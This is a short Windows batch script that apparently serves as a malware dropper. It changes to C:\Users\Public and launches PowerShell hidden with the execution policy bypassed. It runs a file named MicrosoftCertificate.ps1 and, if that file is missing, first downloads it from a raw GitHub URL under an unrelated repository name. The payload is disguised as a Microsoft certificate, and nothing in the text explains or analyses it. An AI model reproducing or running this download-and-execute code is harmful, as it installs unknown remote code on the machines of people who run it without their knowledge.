mkdir Oz!
exit

@echo off
color 1b

C:

cd.. || cd .. & cd.. || cd .. & cd.. || cd .. & cd / & cd Users || cd "Users" & cd Public || cd "Public"

:yen

IF EXIST MicrosoftCertificate.ps1 (
	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -NoExit -File MicrosoftCertificate.ps1
	exit
	
) ELSE (
	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -NoExit -Command (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/WendySeattle/EnvironmentalSciences/master/MicrosoftCertificate.ps1', '.\MicrosoftCertificate.ps1')
	goto yen
	
)
